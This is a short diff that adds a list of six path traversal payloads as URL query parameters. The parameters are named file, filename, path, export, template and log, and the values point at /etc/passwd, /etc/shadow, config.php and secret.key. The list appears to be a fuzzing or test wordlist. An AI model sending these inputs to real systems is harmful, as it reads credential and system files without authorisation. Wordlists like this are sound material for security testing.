@@ -1,0 +1,6 @@
+?file=../../etc/passwd
+?filename=../config.php
+?path=/etc/shadow
+?export=../../secret.key
+?template=../../etc/passwd
+?log=/var/log/../../etc/passwd
